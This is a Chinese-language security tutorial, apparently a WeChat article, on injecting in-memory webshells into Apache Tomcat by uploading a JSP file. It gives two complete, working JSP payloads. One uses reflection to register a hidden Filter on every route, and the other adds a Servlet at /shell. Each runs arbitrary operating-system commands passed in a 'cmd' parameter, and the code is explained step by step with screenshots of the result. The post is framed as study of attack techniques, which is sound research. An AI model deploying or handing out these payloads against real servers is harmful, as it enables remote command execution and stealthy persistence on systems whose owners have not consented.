> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=Mzg3OTEwMzIzNA==&mid=2247483927&idx=1&sn=f98ebcf97319f9b04e8728e82c3bae78&chksm=cf08de7af87f576c8712fc6d5ef630bb3cd523f6ee4ed038d3de64261f2aae6b902eb0c1d3e0&scene=178&cur_album_id=2053086597130027010#rd)

1. 前言 2. 上传 jsp 文件生成 filter 类型的内存马 3. 上传 jsp 文件生成 servlet 类型的内存马 4. 总结 5. 参考链接

1. 前言
-----

前面对内存马的理论知识进行了学习：[https://mp.weixin.qq.com/s/Y4Wvs3YK1J03Kh7HfPY3gg](https://mp.weixin.qq.com/s?__biz=Mzg3OTEwMzIzNA==&mid=2247483917&idx=1&sn=c14965157547d923a7ae2f3b71816c97&scene=21#wechat_redirect)

这篇文章学习使用 jsp 文件注入内存马（可以将恶意的 jsp 文件上传到目标服务器并访问，来注入内存马）。

2. 上传 jsp 文件生成 filter 类型的内存马
----------------------------

首先展示恶意 jsp 文件：

```
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
   final String name = "junxinglu";
   // 获取上下文
   ServletContext servletContext = request.getSession().getServletContext();

   Field appctx = servletContext.getClass().getDeclaredField("context");
   appctx.setAccessible(true);
   ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

   Field stdctx = applicationContext.getClass().getDeclaredField("context");
   stdctx.setAccessible(true);
   StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

   Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
   Configs.setAccessible(true);
   Map filterConfigs = (Map) Configs.get(standardContext);

   if (filterConfigs.get(name) == null){
       Filter filter = new Filter() {
           @Override
           public void init(FilterConfig filterConfig) throws ServletException {

          }

           @Override
           public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
               HttpServletRequest req = (HttpServletRequest) servletRequest;
               if (req.getParameter("cmd") != null) {
                   boolean isLinux = true;
                   String osTyp = System.getProperty("os.name");
                   if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                       isLinux = false;
                  }
                   String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                   InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                   Scanner s = new Scanner( in ).useDelimiter("\\a");
                   String output = s.hasNext() ? s.next() : "";
                   servletResponse.getWriter().write(output);
                   servletResponse.getWriter().flush();
                   return;
              }
               filterChain.doFilter(servletRequest, servletResponse);
          }

           @Override
           public void destroy() {

          }

      };

       FilterDef filterDef = new FilterDef();
       filterDef.setFilter(filter);
       filterDef.setFilterName(name);
       filterDef.setFilterClass(filter.getClass().getName());
       /**
        * 将filterDef添加到filterDefs中
        */
       standardContext.addFilterDef(filterDef);

       FilterMap filterMap = new FilterMap();
       filterMap.addURLPattern("/*");
       filterMap.setFilterName(name);
       filterMap.setDispatcher(DispatcherType.REQUEST.name());

       standardContext.addFilterMapBefore(filterMap);

       Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
       constructor.setAccessible(true);
       ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

       filterConfigs.put(name, filterConfig);
       out.print("Inject Success !");
  }
%>

```

首先看前面几行代码：

```
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

```

这几行代码就是在 jsp 中引入 java classpath 中的类，在前面介绍的文章 “基于 Tomcat 的 Java 内存马初探” 中，有提到`StandardContext`、`FilterDef`这些类。在这个恶意 jsp 文件中，我们根据需要进行引入。

而且通过观察这个 jsp 所引入的类文件，我们知道这个 jsp 注入的 filter 内存马只适合在`tomcat 8`下使用，因为前面也有提到过：

```
tomcat 7:

org.apache.catalina.deploy.FilterDef;
org.apache.catalina.deploy.FilterMap;

tomcat 8:

org.apache.tomcat.util.descriptor.web.FilterDef;
org.apache.tomcat.util.descriptor.web.FilterMap;

```

接着是一系列反射操作获取上下文类对象：

```
ServletContext servletContext = request.getSession().getServletContext();

Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

```

从 request 请求中获取到`ServletContext`上下文对象，再依次获取`ApplicationContext`上下文，最后获取到想要的`StandardContext`上下文，调试可以很清楚地看到各个`Context`直接的关系：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW91RrgoJEolbQiajxmhnlStia3TQGOGnuaDmuhgklY9FB7XEW6zpNlLnERY6gy4gWUOFqRDbAiaica5A/640?wx_fmt=png)

获取`StandardContext`的成员变量`filterConfigs`并实例化，赋值给`Map类型`的变量`filterConfigs`。

```
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(standardContext);

```

调试过程：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW91RrgoJEolbQiajxmhnlStILLXdE6MTITiaqehp0tpibaylPq9CamDC4Gwm09FJI0YsxWdbdu2DcIQ/640?wx_fmt=png)

前面都是通过反射获取到各种跟 filter 相关的一些全局变量。第一行定义了一个 String 类型的 name 变量，作为这个 webapp 中的 filter 的名字，通过上面获取到的`filterConfigs`来判断整个 webapp 中是否已经存在一个叫 name 的 filter 了：

```
if (filterConfigs.get(name) == null)

```

如果不存在就注入一个恶意的 filter。

定义一个命令执行的恶意 filter。

**FilterDefs**：存放 FilterDef 的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息

```
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
/**
* 将filterDef添加到filterDefs中
*/
standardContext.addFilterDef(filterDef);

```

new 一个`FilterDef`对象，将刚刚定义好的恶意 filter 类、filter 名称，以及 filter 类名进行绑定，同时添加到全局的 standardContext 上下文中。

**FilterMaps**：存放 FilterMap 的数组，在 FilterMap 中主要存放了 FilterName 和 对应的 URLPattern

```
FilterMap filterMap = new FilterMap();
filterMap.addURLPattern("/*");
filterMap.setFilterName(name);
filterMap.setDispatcher(DispatcherType.REQUEST.name());

standardContext.addFilterMapBefore(filterMap);

```

new 一个`FilterMap`对象，将路由与该 filter 进行绑定。这里我直接绑定所有路由都经过次 filter 进行处理。同时添加到全局的 standardContext 上下文中。

**FilterConfigs**：存放 filterConfig 的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter 对象等信息

将 filter 添加到`filterConfigs`中：

```
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

filterConfigs.put(name, filterConfig);

```

如此就可以注入一个恶意的 filter 类型的内存马。

演示如下：

第一次访问这个恶意 jsp 文件：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW91RrgoJEolbQiajxmhnlStTNGOWD5MKWSjWWo5eTu6LnQdziaoG1AJQbibYrN7lEkcOmRXk4wWuHOg/640?wx_fmt=png)

提示注入成功。再次访问也不会进行注入了，因为这个 webapp 中已经存在这个 filter 了。

访问根下（/*）任意路由，可以执行系统命令：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW91RrgoJEolbQiajxmhnlStlb4BgRpLTAL3FqzGbtWu0CouODo0IiaITuTu7QictDAvF6tQSia8MLygw/640?wx_fmt=png)

3. 上传 jsp 文件生成 servlet 类型的内存马
-----------------------------

先展示恶意 jsp 文件：

```
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.File" %>
<%@ page import="java.sql.Struct" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.lang.reflect.Field" %>

<%
   // 获取StandardContext
   org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
   StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();

   String name = "junxinglu";
   String servletPath = "/shell";

   Field mappings = standardCtx.getClass().getDeclaredField("servletMappings");
   mappings.setAccessible(true);
   Map servletMappings = (Map) mappings.get(standardCtx);

   if (servletMappings.get(servletPath) == null){
       // 创建恶意Servlet
       Servlet servlet = new Servlet() {
           @Override
           public void init(ServletConfig servletConfig) throws ServletException {

          }
           @Override
           public ServletConfig getServletConfig() {
               return null;
          }
           @Override
           public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
               HttpServletRequest req = (HttpServletRequest) servletRequest;
               if (req.getParameter("cmd") != null){
                   String cmd = req.getParameter("cmd");
                   boolean isLinux = true;
                   String osTyp = System.getProperty("os.name");
                   if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                       isLinux = false;
                  }
                   String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                   InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                   Scanner s = new Scanner(in).useDelimiter("\\a");
                   String output = s.hasNext() ? s.next() : "";
                   PrintWriter out = servletResponse.getWriter();
                   out.println(output);
                   out.flush();
                   out.close();
              }
          }
           @Override
           public String getServletInfo() {
               return null;
          }
           @Override
           public void destroy() {

          }
      };

       // 用Wrapper对其进行封装
       org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
       newWrapper.setName(name);
       newWrapper.setLoadOnStartup(1);
       newWrapper.setServlet(servlet);
       newWrapper.setServletClass(servlet.getClass().getName());

       // 添加封装后的恶意Wrapper到StandardContext的children当中
       standardCtx.addChild(newWrapper);

       // 添加ServletMapping将访问的URL和Servlet进行绑定
       standardCtx.addServletMapping(servletPath, name);
       out.print("Inject Success !");
  }
%>

```

前面几行依然是引入相关的 Java 类。

接着获取上下文对象`StandardContext`，不同于上面通过`request`进行获取：

```
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();

```

定义 servlet 的名字和对应的 urlPath，同时通过反射获取`StandardContext`的成员变量：`servletMappings`对象，通过它来判断整个 webapp 中是否已经存在对应的 urlPath 了，如果不存在，则进行注入 servlet 内存马操作。

```
String name = "junxinglu";
String servletPath = "/shell";

Field mappings = standardCtx.getClass().getDeclaredField("servletMappings");
mappings.setAccessible(true);
Map servletMappings = (Map) mappings.get(standardCtx);

if (servletMappings.get(servletPath) == null)

```

创建一个恶意的 servlet 对象，创建一个 Wrapper 对象，并对 servlet 进行封装；添加封装后的恶意 Wrapper 到 StandardContext 的 children 当中

```
// 用Wrapper对其进行封装
org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
newWrapper.setName(name);
newWrapper.setLoadOnStartup(1);
newWrapper.setServlet(servlet);
newWrapper.setServletClass(servlet.getClass().getName());

// 添加封装后的恶意Wrapper到StandardContext的children当中
standardCtx.addChild(newWrapper);

```

最后将 servlet 名称与 urlPath 进行绑定即可：

```
// 添加ServletMapping将访问的URL和Servlet进行绑定
standardCtx.addServletMapping(servletPath, name);

```

效果演示如下：

第一次访问这个恶意 jsp 文件：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW91RrgoJEolbQiajxmhnlStcw1GtkpCaWMMATIVuEnvWDI8pdeyvtfKLmD2RvFu5AdCHbtNUHNbfw/640?wx_fmt=png)

提示注入成功。再次访问也不会再进行内存马注入操作了。

访问`/shell`这个路由，可以执行系统命令：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW91RrgoJEolbQiajxmhnlSt5tfMcMyuySNkwaC0jXyPvOAmuqCMa04YOWO6IAZBFfNNp3XTyTsNzg/640?wx_fmt=png)

4. 总结
-----

本文通过编写两个 jsp 文件并访问，达到注入 filter 和 servlet 内存马的功能。对前面学习的内存马相关的理论知识进行实践。

5. 参考链接
-------

Tomcat 内存马学习 (一)：Filter 型

一文看懂内存马

Tomcat 内存马学习 (二)：结合反序列化注入内存马